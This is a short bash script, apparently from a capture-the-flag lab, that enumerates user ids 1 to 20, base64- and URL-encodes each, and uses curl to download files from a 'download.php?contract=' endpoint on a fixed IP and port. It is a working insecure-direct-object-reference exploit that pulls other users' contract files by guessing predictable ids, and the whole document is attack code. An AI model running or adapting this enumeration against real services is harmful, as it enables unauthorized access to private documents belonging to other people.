#!/bin/bash

url="http://94.237.55.43:44450"

for i in {1..20}; do
    b64=$(echo -n "$i" | base64 -w 0)
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$b64'))")

    echo "[*] uid=$i → $encoded"
    curl -sOJ "$url/download.php?contract=$encoded"
done

